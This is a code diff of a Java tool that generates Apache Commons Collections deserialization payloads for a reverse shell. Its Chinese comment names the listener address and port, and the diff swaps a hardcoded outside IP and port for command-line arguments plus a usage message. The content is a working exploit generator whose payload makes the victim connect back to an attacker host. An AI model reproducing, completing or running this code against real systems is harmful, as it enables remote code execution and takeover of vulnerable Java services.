@@ -28,7 +28,7 @@ import org.apache.commons.collections.map.TransformedMap;
  */
 public class Main {
 
-	public static Object Reverse_Payload(String ip, int port) throws Exception {
+	public static Object Reverse_Payload(String ip, String port) throws Exception {
 		final Transformer[] transforms = new Transformer[] {
 				new ConstantTransformer(java.net.URLClassLoader.class),
 				// getConstructor class.class classname
@@ -70,8 +70,9 @@ public class Main {
 	}
 
 	public static void main(String[] args) throws Exception {
-		GeneratePayload(Reverse_Payload("108.61.162.74", 888),
-				"/tmp/payload");
+		GeneratePayload(Reverse_Payload(args[0], args[1]),
+				args[2]);
+		System.out.print("usage:\n  java -jar Main.jar [ip/domain] [port] [out_payload_file]");
 		// 反彈監聽地址及端口，生成payload本地路徑
 	}
 
